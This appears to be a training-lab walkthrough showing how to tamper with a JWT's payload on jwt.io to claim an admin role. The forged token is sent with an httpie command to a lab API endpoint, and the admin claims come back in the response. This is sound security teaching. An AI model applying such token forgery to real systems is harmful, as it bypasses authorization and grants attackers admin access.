## 'none' Signed Token

##### Step 1:

* Open browser

![](img/open-browser.png)


##### Step 2:

* open `http://sls-training-ui.s3-website-us-east-1.amazonaws.com/` to access the XML-Uploader application.

![](img/login-page.png)


##### Step 3:

* Using `email` and `password` login to the application.

![](img/login-page.png)

##### Step 4:

* Click `Shift + f9` or right click on top of the browser and click on `Web Developer`,  select the `Storage Inspect` tab.

![](img/local-storage.png)

##### Step 5:

* Click on `Local-Storage` icon on left, and expand.

    * Copy the `token`
    
    ![](img/get_token.png)

#### Step 6:

* Open https://jwt.io/ and paste the token. Tamper the value in Payload section to 


    {
    "username": "admin",
    "role": "admin",
    "email": "admin@widget.co"
    }


![](img/tamper-jwt.png)


##### Step 7:

* Open Terminal

![](img/Open-Terminal.png)

##### Step 8:

* Run ` http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:<paste the copied token>`

```commandline
root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkB3aWRnZXQuY28ifQ.PSIL13J1t8Rrfd33fxgO2X3EaDaFQcsa0S3dAi07GLU
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
Access-Control-Allow-Methods: GET,OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 0
Connection: keep-alive
Content-Length: 73
Content-Type: application/json
Date: Tue, 25 Sep 2018 16:32:05 GMT
Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
X-Amz-Cf-Id: yLaZex5YV7JTNFJoZrvlauQwCftBBi3Gpp2MP7rIAoGFd0MCIiBJ5g==
X-Amzn-Trace-Id: Root=1-5baa6305-3c51c12dc7373ad2db05ab16;Sampled=1
X-Cache: Miss from cloudfront
x-amz-apigw-id: NyRo5FXGIAMFpfg=
x-amzn-RequestId: 8a1c7c11-c0e0-11e8-9e6d-b3dfa2e0c648

{
    "decoded": {
        "email": "admin@widget.co", 
        "role": "admin", 
        "username": "admin"
    }
}
```
